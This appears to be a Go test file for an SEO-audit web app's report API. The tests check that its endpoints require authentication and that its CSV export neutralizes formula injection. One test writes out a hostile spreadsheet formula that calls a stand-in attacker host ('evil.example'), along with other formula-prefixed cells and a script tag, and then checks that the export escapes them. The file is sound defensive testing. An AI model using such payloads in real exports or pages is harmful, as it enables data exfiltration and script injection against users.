package main

import (
	"encoding/csv"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/igor-zatochniy/seo-auditor/internal/geo"
)

func TestOpportunityEndpointsRequireAuthentication(t *testing.T) {
	app := testWebApp()
	id := newWebRunID()
	for _, path := range []string{"/opportunities", "/tasks.csv", "/targets", "/impact", "/visibility-series", "/queries/1/target-history"} {
		w := httptest.NewRecorder()
		app.handler().ServeHTTP(w, httptest.NewRequest("GET", "http://127.0.0.1:8080/api/geo/reports/"+id+path, nil))
		if w.Code != 401 {
			t.Fatal(path, w.Code)
		}
	}
	w := httptest.NewRecorder()
	app.handler().ServeHTTP(w, httptest.NewRequest("POST", "http://127.0.0.1:8080/api/geo/reports/"+id+"/queries/1/target", strings.NewReader(`{}`)))
	if w.Code != 401 {
		t.Fatal(w.Code)
	}
}
func TestOpportunityCSVNeutralizesUntrustedCells(t *testing.T) {
	w := httptest.NewRecorder()
	writeOpportunityCSV(w, geoReport{ID: newWebRunID(), Model: geo.Model}, geo.OpportunityPlan{Model: geo.OpportunityModel, Tasks: []geo.Opportunity{{ID: "1", Priority: "high", Action: "=IMPORTXML(\"https://evil.example\")", TargetURL: "+danger", Clusters: []string{"@formula"}, Queries: []string{"-query"}, Confidence: geo.Confidence{Level: "low"}, Evidence: []geo.TaskEvidence{{Detail: "<script>danger</script>"}}}}})
	rows, err := csv.NewReader(strings.NewReader(strings.TrimPrefix(w.Body.String(), "\ufeff"))).ReadAll()
	if err != nil || len(rows) != 2 {
		t.Fatal(rows, err)
	}
	for _, i := range []int{3, 4, 5, 6} {
		if !strings.HasPrefix(rows[1][i], "'") {
			t.Fatal("formula not neutralized", rows[1][i])
		}
	}
}

func TestOpportunityCSVShowsFullScopeAndDisplayLimits(t *testing.T) {
	w := httptest.NewRecorder()
	writeOpportunityCSV(w, geoReport{ID: newWebRunID(), Model: geo.Model}, geo.OpportunityPlan{
		Model: geo.OpportunityModel, CheckedPages: 10001, Limited: true,
		Warnings: []string{"Перелік завдань обмежений"}, Tasks: []geo.Opportunity{{ID: "1", Priority: "high"}},
	})
	rows, err := csv.NewReader(strings.NewReader(strings.TrimPrefix(w.Body.String(), "\ufeff"))).ReadAll()
	if err != nil || len(rows) != 2 || rows[0][13] != "Перевірено сторінок" || rows[1][13] != "10001" || rows[1][14] != "Так" || !strings.Contains(rows[1][15], "обмежений") {
		t.Fatal(rows, err)
	}
}
